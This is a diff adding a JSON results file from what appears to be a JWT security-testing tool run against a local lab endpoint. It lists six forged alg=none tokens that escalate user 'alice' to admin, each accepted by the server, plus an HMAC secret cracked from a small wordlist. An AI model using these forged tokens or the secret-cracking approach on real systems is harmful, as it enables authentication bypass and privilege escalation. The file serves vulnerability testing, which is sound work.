@@ -1,0 +1,123 @@
+{
+  "module": "jwt_inspector",
+  "decoded": {
+    "header": {
+      "alg": "HS256",
+      "typ": "JWT"
+    },
+    "payload": {
+      "sub": "alice",
+      "role": "user"
+    },
+    "signature_present": true,
+    "observations": [
+      "Token uses symmetric HMAC (HS256); susceptible to offline secret guessing if weak.",
+      "Missing 'exp' expiration claim (token never expires)."
+    ]
+  },
+  "alg_none_test": {
+    "tested": true,
+    "endpoint_url": "http://127.0.0.1:50698/api/jwt-protected",
+    "enforces_signature_baseline": true,
+    "valid_token_status": 200,
+    "corrupted_signature_status": 401,
+    "vulnerable": true,
+    "accepted_variants": [
+      {
+        "variant": "alg=none (trailing_dot)",
+        "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=none (no_trailing_dot)",
+        "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=None (trailing_dot)",
+        "forged_token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=None (no_trailing_dot)",
+        "forged_token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=NONE (trailing_dot)",
+        "forged_token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=NONE (no_trailing_dot)",
+        "forged_token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      }
+    ],
+    "all_probes": [
+      {
+        "variant": "alg=none (trailing_dot)",
+        "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=none (no_trailing_dot)",
+        "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=None (trailing_dot)",
+        "forged_token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=None (no_trailing_dot)",
+        "forged_token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=NONE (trailing_dot)",
+        "forged_token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      },
+      {
+        "variant": "alg=NONE (no_trailing_dot)",
+        "forged_token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9",
+        "status_code": 200,
+        "accepted": true,
+        "body_preview": "{\"authenticated\": true, \"claims\": {\"sub\": \"alice\", \"role\": \"admin\"}}"
+      }
+    ]
+  },
+  "secret_guessing": {
+    "attempted": true,
+    "cracked": true,
+    "secret": "vulnstrike-lab-secret",
+    "algorithm": "HS256",
+    "wordlist": "C:\\Users\\acer\\Downloads\\vulnstrike_ai\\vulnstrike\\examples\\sample_wordlist.txt",
+    "attempts": 8,
+    "elapsed_ms": 1.8
+  }
+}
